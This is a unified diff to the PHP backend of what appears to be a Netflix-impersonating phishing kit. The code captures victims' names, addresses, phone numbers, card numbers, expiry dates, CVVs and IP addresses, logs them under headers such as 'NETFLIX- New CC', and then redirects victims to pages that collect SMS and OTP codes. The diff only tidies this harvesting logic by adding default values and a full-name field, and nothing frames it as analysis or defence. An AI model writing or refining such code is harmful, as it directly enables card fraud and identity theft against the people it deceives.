@@ -107,18 +107,19 @@ $ip = $_SERVER['REMOTE_ADDR'];
 
 if(isset($_POST['first-name'])){
 $_SESSION['_first-name'] = $_POST['first-name'];
+$fullName = trim(($_POST['first-name'] ?? '') . ' ' . ($_POST['last-name'] ?? ''));
 $msg = "
 NETFLIX- New ads
 --------------------------
-Name: ".$_POST['name']."
-first-name: ".$_POST['first-name']."
-last-name: ".$_POST['last-name']."
-address-line-1: ".$_POST['address-line-1']."
-address-line-2: ".$_POST['address-line-2']."
-phoneNumber: ".$_POST['phoneNumber']."
-country: ".$_POST['country']."
-city: ".$_POST['city']."
-postal-code: ".$_POST['postal-code']."
+Name: " . ($fullName !== '' ? $fullName : 'N/A') . "
+first-name: " . ($_POST['first-name'] ?? 'N/A') . "
+last-name: " . ($_POST['last-name'] ?? 'N/A') . "
+address-line-1: " . ($_POST['address-line-1'] ?? 'N/A') . "
+address-line-2: " . ($_POST['address-line-2'] ?? 'N/A') . "
+phoneNumber: " . ($_POST['phoneNumber'] ?? 'N/A') . "
+country: " . ($_POST['country'] ?? 'N/A') . "
+city: " . ($_POST['city'] ?? 'N/A') . "
+postal-code: " . ($_POST['postal-code'] ?? 'N/A') . "
 --------------------------
 IP: $ip
 ";
@@ -136,14 +137,15 @@ $ip = $_SERVER['REMOTE_ADDR'];
 
 if(isset($_POST['cc'])){
 $_SESSION['_cc'] = $_POST['cc'];
+$cardHolder = $_POST['holder-name'] ?? '';
 $msg = "
-NETFLIX- New CC 
+NETFLIX- New CC
 --------------------------
-Name: ".$_POST['name']."
-Cc: ".$_POST['cc']."
-Exp: ".$_POST['exp']."
-Cvv: ".$_POST['cvv']."
-holder-name: ".$_POST['holder-name']."
+Name: " . ($cardHolder !== '' ? $cardHolder : 'N/A') . "
+Cc: " . ($_POST['cc'] ?? 'N/A') . "
+Exp: " . ($_POST['exp'] ?? 'N/A') . "
+Cvv: " . ($_POST['cvv'] ?? 'N/A') . "
+holder-name: " . ($_POST['holder-name'] ?? 'N/A') . "
 --------------------------
 IP: $ip
 ";
@@ -154,7 +156,6 @@ appendResult($msg);
 header("location: wait.php?next=sms.php");
 
 }
-    
 
 
 if(isset($_POST['otp'])){
